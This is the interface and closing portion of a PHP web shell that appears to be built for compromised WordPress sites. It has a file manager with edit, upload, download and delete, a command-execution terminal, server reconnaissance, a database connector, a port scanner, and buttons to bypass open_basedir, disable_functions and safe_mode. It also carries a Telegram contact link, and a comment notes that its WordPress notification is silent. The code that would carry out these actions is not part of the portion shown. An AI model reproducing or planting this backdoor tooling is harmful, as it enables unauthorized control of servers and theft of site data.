                    <span><strong>PHP:</strong> <?php echo htmlspecialchars($sysInfo['php']); ?></span>
                    <span><strong>Server:</strong> <?php echo htmlspecialchars($sysInfo['server']); ?></span>
                    <span><strong>User:</strong> <?php echo htmlspecialchars($sysInfo['user']); ?></span>
                    <span><strong>IP:</strong> <?php echo htmlspecialchars($sysInfo['ip']); ?></span>
                </div>
                
                <div style="font-size: 11px; margin-top: 10px; color: #ff4444; opacity: 0.8;">
                    ⚠️ Authorized access only. You are responsible for your actions.
                </div>
            </div>
            
            <!-- Regular Notification (WordPress notification is now silent) -->
            <?php if ($notification): ?>
            <div class="notification <?php echo $notification['type']; ?>">
                <?php echo htmlspecialchars($notification['text']); ?>
            </div>
            <?php endif; ?>
            
            <div class="tabs">
                <div class="tab <?php echo $activeTab === 'filemanager' ? 'active' : ''; ?>" onclick="switchTab('filemanager')">
                    <span class="tab-icon">📁</span> File Manager
                </div>
                <div class="tab <?php echo $activeTab === 'terminal' ? 'active' : ''; ?>" onclick="switchTab('terminal')">
                    <span class="tab-icon">💻</span> Terminal
                </div>
                <div class="tab <?php echo $activeTab === 'info' ? 'active' : ''; ?>" onclick="switchTab('info')">
                    <span class="tab-icon">ℹ️</span> System Info
                </div>
                <div class="tab <?php echo $activeTab === 'database' ? 'active' : ''; ?>" onclick="switchTab('database')">
                    <span class="tab-icon">🗄️</span> Database
                </div>
                <div class="tab <?php echo $activeTab === 'network' ? 'active' : ''; ?>" onclick="switchTab('network')">
                    <span class="tab-icon">🌐</span> Network
                </div>
                <div class="tab <?php echo $activeTab === 'bypass' ? 'active' : ''; ?>" onclick="switchTab('bypass')">
                    <span class="tab-icon">🔓</span> Bypass
                </div>
            </div>
            
            <!-- File Manager Tab -->
            <div class="tab-content <?php echo $activeTab === 'filemanager' ? 'active' : ''; ?>" id="filemanager">
                <form method="get" class="path-bar">
                    <input type="text" name="p" value="<?php echo htmlspecialchars($currentPath); ?>" placeholder="Enter path...">
                    <button type="submit" class="btn">Navigate</button>
                </form>
                
                <div class="tools">
                    <form method="post" enctype="multipart/form-data" class="tool-group">
                        <label>Upload:</label>
                        <input type="file" name="upload" required>
                        <button type="submit" class="btn btn-small btn-success">Upload</button>
                    </form>
                    
                    <div class="tool-group">
                        <button onclick="showNewFile()" class="btn btn-small">New File</button>
                        <button onclick="showNewFolder()" class="btn btn-small">New Folder</button>
                    </div>
                </div>
                
                <?php if ($editMode): ?>
                <div>
                    <h3 style="margin-bottom: 15px; color: #0ff;">Editing: <?php echo htmlspecialchars($editFile); ?></h3>
                    <form method="post">
                        <input type="hidden" name="save" value="<?php echo htmlspecialchars($editFile); ?>">
                        <textarea name="content" class="edit-area"><?php echo htmlspecialchars($editContent); ?></textarea>
                        <div style="margin-top: 15px; display: flex; gap: 10px;">
                            <button type="submit" class="btn btn-success">Save Changes</button>
                            <a href="?tab=filemanager&p=<?php echo urlencode($currentPath); ?>" class="btn btn-danger">Cancel</a>
                        </div>
                    </form>
                </div>
                <?php else: ?>
                <table class="file-table">
                    <thead>
                        <tr>
                            <th width="35%">Name</th>
                            <th width="10%">Type</th>
                            <th width="10%">Size</th>
                            <th width="10%">Perms</th>
                            <th width="15%">Modified</th>
                            <th width="20%">Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if ($currentPath !== '/'): ?>
                        <tr>
                            <td colspan="6">
                                <a href="?tab=filemanager&p=<?php echo urlencode(dirname($currentPath)); ?>">
                                    <span class="file-icon">📂</span> Parent Directory
                                </a>
                            </td>
                        </tr>
                        <?php endif; ?>
                        
                        <?php if (!empty($folders)): ?>
                        <tr class="separator-row"><td colspan="6">📁 Folders</td></tr>
                        <?php foreach ($folders as $folder):
                            $fullPath = $currentPath . $folder;
                            $protected = zet_fm_is_protected($fullPath);
                            $perms = zet_fm_get_permissions($fullPath);
                            $writable = @is_writable($fullPath);
                            $modified = @filemtime($fullPath);
                            $rowClass = $protected ? 'protected-row' : 'folder-row';
                        ?>
                        <tr class="<?php echo $rowClass; ?>">
                            <td>
                                <a href="?tab=filemanager&p=<?php echo urlencode($fullPath); ?>">
                                    <span class="perm-indicator <?php echo $writable ? 'writable' : 'readonly'; ?>"></span>
                                    <span class="file-icon">📁</span>
                                    <span class="<?php echo $writable ? 'perm-writable' : 'perm-readonly'; ?>">
                                        <?php echo htmlspecialchars($folder); ?>
                                    </span>
                                    <?php if ($protected): ?><span class="protected-badge">🔒 Protected</span><?php endif; ?>
                                </a>
                            </td>
                            <td>Folder</td>
                            <td>-</td>
                            <td class="<?php echo $writable ? 'perm-writable' : 'perm-readonly'; ?>"><?php echo $perms; ?></td>
                            <td><?php echo $modified ? date('Y-m-d H:i', $modified) : '-'; ?></td>
                            <td>
                                <div class="file-actions">
                                    <a href="#" onclick="renameItem('<?php echo htmlspecialchars($folder); ?>'); return false;">Rename</a>
                                    <a href="#" onclick="chmodItem('<?php echo htmlspecialchars($folder); ?>'); return false;">Chmod</a>
                                    <a href="?tab=filemanager&p=<?php echo urlencode($currentPath); ?>&do=delete&item=<?php echo urlencode($folder); ?>" 
                                       class="delete <?php echo $protected ? 'protected' : ''; ?>" 
                                       onclick="<?php echo $protected ? 'alert(\'This folder is protected and cannot be deleted.\'); return false;' : 'return confirm(\'Delete this folder and all its contents?\')'; ?>">Delete</a>
                                </div>
                            </td>
                        </tr>
                        <?php endforeach; endif; ?>
                        
                        <?php if (!empty($files)): ?>
                        <tr class="separator-row"><td colspan="6">📄 Files</td></tr>
                        <?php foreach ($files as $file):
                            $fullPath = $currentPath . $file;
                            $protected = zet_fm_is_protected($fullPath);
                            $size = @filesize($fullPath);
                            $perms = zet_fm_get_permissions($fullPath);
                            $writable = @is_writable($fullPath);
                            $modified = @filemtime($fullPath);
                            $ext = strtoupper(pathinfo($file, PATHINFO_EXTENSION) ?: 'FILE');
                            
                            if ($size !== false) {
                                if ($size < 1024) $size = $size . ' B';
                                elseif ($size < 1048576) $size = round($size/1024, 1) . ' KB';
                                elseif ($size < 1073741824) $size = round($size/1048576, 1) . ' MB';
                                else $size = round($size/1073741824, 1) . ' GB';
                            } else {
                                $size = '?';
                            }
                            $rowClass = $protected ? 'protected-row' : '';
                        ?>
                        <tr class="<?php echo $rowClass; ?>">
                            <td>
                                <span style="display: inline-flex; align-items: center; gap: 8px;">
                                    <span class="perm-indicator <?php echo $writable ? 'writable' : 'readonly'; ?>"></span>
                                    <span class="file-icon">📄</span>
                                    <span class="<?php echo $writable ? 'perm-writable' : 'perm-readonly'; ?>">
                                        <?php echo htmlspecialchars($file); ?>
                                    </span>
                                    <?php if ($protected): ?><span class="protected-badge">🔒 Protected</span><?php endif; ?>
                                </span>
                            </td>
                            <td><?php echo $ext; ?></td>
                            <td><?php echo $size; ?></td>
                            <td class="<?php echo $writable ? 'perm-writable' : 'perm-readonly'; ?>"><?php echo $perms; ?></td>
                            <td><?php echo $modified ? date('Y-m-d H:i', $modified) : '-'; ?></td>
                            <td>
                                <div class="file-actions">
                                    <a href="?tab=filemanager&p=<?php echo urlencode($currentPath); ?>&do=edit&item=<?php echo urlencode($file); ?>">Edit</a>
                                    <a href="?tab=filemanager&p=<?php echo urlencode($currentPath); ?>&do=download&item=<?php echo urlencode($file); ?>">Download</a>
                                    <a href="#" onclick="renameItem('<?php echo htmlspecialchars($file); ?>'); return false;">Rename</a>
                                    <a href="#" onclick="chmodItem('<?php echo htmlspecialchars($file); ?>'); return false;">Chmod</a>
                                    <a href="?tab=filemanager&p=<?php echo urlencode($currentPath); ?>&do=delete&item=<?php echo urlencode($file); ?>" 
                                       class="delete <?php echo $protected ? 'protected' : ''; ?>"
                                       onclick="<?php echo $protected ? 'alert(\'This file is protected and cannot be deleted.\'); return false;' : 'return confirm(\'Delete this file?\')'; ?>">Delete</a>
                                </div>
                            </td>
                        </tr>
                        <?php endforeach; endif; ?>
                        
                        <?php if (empty($folders) && empty($files)): ?>
                        <tr><td colspan="6" class="empty">Empty directory</td></tr>
                        <?php endif; ?>
                    </tbody>
                </table>
                <?php endif; ?>
            </div>
            
            <!-- Terminal Tab -->
            <div class="tab-content <?php echo $activeTab === 'terminal' ? 'active' : ''; ?>" id="terminal">
                <div class="terminal-output"><?php echo htmlspecialchars($commandOutput); ?></div>
                <form method="post" class="terminal-input">
                    <input type="text" name="command" placeholder="Enter command..." autocomplete="off">
                    <button type="submit" class="btn">Execute</button>
                </form>
            </div>
            
            <!-- System Info Tab -->
            <div class="tab-content <?php echo $activeTab === 'info' ? 'active' : ''; ?>" id="info">
                <div class="info-grid">
                    <div class="info-card">
                        <h3>🖥️ System Information</h3>
                        <div class="info-item">
                            <span class="info-label">OS</span>
                            <span class="info-value"><?php echo htmlspecialchars($sysInfo['os']); ?></span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Hostname</span>
                            <span class="info-value"><?php echo htmlspecialchars($sysInfo['hostname']); ?></span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">User</span>
                            <span class="info-value"><?php echo htmlspecialchars($sysInfo['user']); ?></span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Server IP</span>
                            <span class="info-value"><?php echo htmlspecialchars($sysInfo['ip']); ?></span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Server Port</span>
                            <span class="info-value"><?php echo htmlspecialchars($sysInfo['port']); ?></span>
                        </div>
                    </div>
                    
                    <div class="info-card">
                        <h3>🐘 PHP Configuration</h3>
                        <div class="info-item">
                            <span class="info-label">PHP Version</span>
                            <span class="info-value"><?php echo htmlspecialchars($sysInfo['php']); ?></span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Server Software</span>
                            <span class="info-value"><?php echo htmlspecialchars($sysInfo['server']); ?></span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Open Basedir</span>
                            <span class="info-value"><?php echo htmlspecialchars($sysInfo['open_basedir']); ?></span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Disabled Functions</span>
                            <span class="info-value" style="font-size: 11px;"><?php echo htmlspecialchars($sysInfo['disable_functions']); ?></span>
                        </div>
                    </div>
                    
                    <div class="info-card">
                        <h3>💾 Disk Usage</h3>
                        <div class="info-item">
                            <span class="info-label">Total Space</span>
                            <span class="info-value"><?php echo htmlspecialchars($sysInfo['disk_total']); ?></span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Used Space</span>
                            <span class="info-value"><?php echo htmlspecialchars($sysInfo['disk_used']); ?></span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Free Space</span>
                            <span class="info-value"><?php echo htmlspecialchars($sysInfo['disk_free']); ?></span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Usage</span>
                            <span class="info-value"><?php echo htmlspecialchars($sysInfo['disk_percent']); ?></span>
                        </div>
                        <div class="progress-bar">
                            <div class="progress-fill" style="width: <?php echo htmlspecialchars($sysInfo['disk_percent']); ?>"></div>
                        </div>
                    </div>
                    
                    <div class="info-card">
                        <h3>⚙️ PHP Limits</h3>
                        <div class="info-item">
                            <span class="info-label">Memory Limit</span>
                            <span class="info-value"><?php echo htmlspecialchars($sysInfo['memory_limit']); ?></span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Max Execution Time</span>
                            <span class="info-value"><?php echo htmlspecialchars($sysInfo['max_execution_time']); ?>s</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Upload Max Filesize</span>
                            <span class="info-value"><?php echo htmlspecialchars($sysInfo['upload_max_filesize']); ?></span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Post Max Size</span>
                            <span class="info-value"><?php echo htmlspecialchars($sysInfo['post_max_size']); ?></span>
                        </div>
                    </div>
                    
                    <div class="info-card">
                        <h3>🔌 Extensions</h3>
                        <div class="info-item">
                            <span class="info-label">MySQL</span>
                            <span class="info-value"><?php echo htmlspecialchars($sysInfo['mysql']); ?></span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">cURL</span>
                            <span class="info-value"><?php echo htmlspecialchars($sysInfo['curl']); ?></span>
                        </div>
                    </div>
                    
                    <?php if ($isWordPress): ?>
                    <div class="info-card">
                        <h3>🔷 WordPress</h3>
                        <div class="info-item">
                            <span class="info-label">WP Loaded</span>
                            <span class="info-value"><?php echo htmlspecialchars($sysInfo['wp_loaded']); ?></span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">WP Version</span>
                            <span class="info-value"><?php echo htmlspecialchars($sysInfo['wp_version']); ?></span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">ABSPATH</span>
                            <span class="info-value" style="font-size: 11px;"><?php echo htmlspecialchars(ABSPATH); ?></span>
                        </div>
                    </div>
                    <?php endif; ?>
                </div>
            </div>
            
            <!-- Database Tab -->
            <div class="tab-content <?php echo $activeTab === 'database' ? 'active' : ''; ?>" id="database">
                <h3 style="margin-bottom: 20px; color: #0ff;">Database Connection</h3>
                <form method="post">
                    <div class="tool-group" style="width: 100%; margin-bottom: 15px;">
                        <label>Host:</label>
                        <input type="text" name="db_host" placeholder="localhost" value="localhost" style="flex: 1;">
                    </div>
                    <div class="tool-group" style="width: 100%; margin-bottom: 15px;">
                        <label>Username:</label>
                        <input type="text" name="db_user" placeholder="root" style="flex: 1;">
                    </div>
                    <div class="tool-group" style="width: 100%; margin-bottom: 15px;">
                        <label>Password:</label>
                        <input type="password" name="db_pass" placeholder="" style="flex: 1;">
                    </div>
                    <div class="tool-group" style="width: 100%; margin-bottom: 15px;">
                        <label>Database:</label>
                        <input type="text" name="db_name" placeholder="" style="flex: 1;">
                    </div>
                    <button type="submit" class="btn btn-success">Connect</button>
                </form>
            </div>
            
            <!-- Network Tab -->
            <div class="tab-content <?php echo $activeTab === 'network' ? 'active' : ''; ?>" id="network">
                <h3 style="margin-bottom: 20px; color: #0ff;">Port Scanner</h3>
                <form method="post">
                    <div class="tool-group" style="width: 100%; margin-bottom: 15px;">
                        <label>Host:</label>
                        <input type="text" name="scan_host" placeholder="127.0.0.1" value="127.0.0.1" style="flex: 1;">
                    </div>
                    <div class="tool-group" style="width: 100%; margin-bottom: 15px;">
                        <label>Port Start:</label>
                        <input type="number" name="scan_port_start" placeholder="1" value="1" style="flex: 1;">
                    </div>
                    <div class="tool-group" style="width: 100%; margin-bottom: 15px;">
                        <label>Port End:</label>
                        <input type="number" name="scan_port_end" placeholder="1000" value="1000" style="flex: 1;">
                    </div>
                    <button type="submit" class="btn btn-warning">Scan</button>
                </form>
            </div>
            
            <!-- Bypass Tab -->
            <div class="tab-content <?php echo $activeTab === 'bypass' ? 'active' : ''; ?>" id="bypass">
                <h3 style="margin-bottom: 20px; color: #0ff;">Security Bypass</h3>
                <div class="tools">
                    <a href="?tab=bypass&bypass=open_basedir" class="btn btn-warning">Bypass open_basedir</a>
                    <a href="?tab=bypass&bypass=disable_functions" class="btn btn-warning">Bypass disable_functions</a>
                    <a href="?tab=bypass&bypass=safe_mode" class="btn btn-warning">Bypass safe_mode</a>
                </div>
            </div>
        </div>
        
        <!-- Telegram Button -->
        <a href="https://t.me/zetgifar" target="_blank" class="telegram-btn">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
            </svg>
            <span>Telegram</span>
        </a>
        
        <!-- New File Modal -->
        <div id="newFileModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">Create New File</div>
                <form method="post">
                    <div class="modal-body">
                        <input type="text" name="newfile" placeholder="Filename (e.g., index.php)" required>
                        <textarea name="filecontent" placeholder="File content (optional)"></textarea>
                    </div>
                    <div class="modal-footer">
                        <button type="submit" class="btn btn-success">Create</button>
                        <button type="button" class="btn btn-danger" onclick="closeModal('newFileModal')">Cancel</button>
                    </div>
                </form>
            </div>
        </div>
        
        <!-- New Folder Modal -->
        <div id="newFolderModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">Create New Folder</div>
                <form method="post">
                    <div class="modal-body">
                        <input type="text" name="newfolder" placeholder="Folder name" required>
                    </div>
                    <div class="modal-footer">
                        <button type="submit" class="btn btn-success">Create</button>
                        <button type="button" class="btn btn-danger" onclick="closeModal('newFolderModal')">Cancel</button>
                    </div>
                </form>
            </div>
        </div>
        
        <script>
            function switchTab(tabName) {
                document.querySelectorAll('.tab-content').forEach(tab => {
                    tab.classList.remove('active');
                });
                document.querySelectorAll('.tab').forEach(tab => {
                    tab.classList.remove('active');
                });
                document.getElementById(tabName).classList.add('active');
                const tabs = ['filemanager', 'terminal', 'info', 'database', 'network', 'bypass'];
                document.querySelector(`.tab:nth-child(${tabs.indexOf(tabName) + 1})`).classList.add('active');
            }
            
            function showNewFile() {
                document.getElementById('newFileModal').classList.add('active');
            }
            
            function showNewFolder() {
                document.getElementById('newFolderModal').classList.add('active');
            }
            
            function closeModal(id) {
                document.getElementById(id).classList.remove('active');
            }
            
            function renameItem(oldName) {
                var newName = prompt('Enter new name:', oldName);
                if (newName && newName !== oldName) {
                    var form = document.createElement('form');
                    form.method = 'post';
                    form.innerHTML = '<input type="hidden" name="oldname" value="' + oldName + '">' +
                                   '<input type="hidden" name="newname" value="' + newName + '">';
                    document.body.appendChild(form);
                    form.submit();
                }
            }
            
            function chmodItem(item) {
                var mode = prompt('Enter new permissions (e.g., 755):', '755');
                if (mode) {
                    var form = document.createElement('form');
                    form.method = 'post';
                    form.innerHTML = '<input type="hidden" name="chmod_item" value="' + item + '">' +
                                   '<input type="hidden" name="chmod_value" value="' + mode + '">';
                    document.body.appendChild(form);
                    form.submit();
                }
            }
            
            setTimeout(function() {
                document.querySelectorAll('.notification').forEach(function(n) {
                    n.style.opacity = '0';
                    setTimeout(function() { n.style.display = 'none'; }, 300);
                });
            }, 5000);
            
            document.addEventListener('keydown', function(e) {
                if (e.ctrlKey && e.key === 'n') {
                    e.preventDefault();
                    showNewFile();
                }
                if (e.ctrlKey && e.shiftKey && e.key === 'N') {
                    e.preventDefault();
                    showNewFolder();
                }
                if (e.key === 'Escape') {
                    document.querySelectorAll('.modal.active').forEach(function(m) {
                        m.classList.remove('active');
                    });
                }
            });
            
            document.querySelectorAll('.modal').forEach(function(modal) {
                modal.addEventListener('click', function(e) {
                    if (e.target === modal) {
                        modal.classList.remove('active');
                    }
                });
            });
        </script>
    </body>
    </html>
    <?php
}

// =============================================
// EXECUTION
// =============================================
if (!defined('ABSPATH')) {
    zet_fm_render_page();
    exit;
}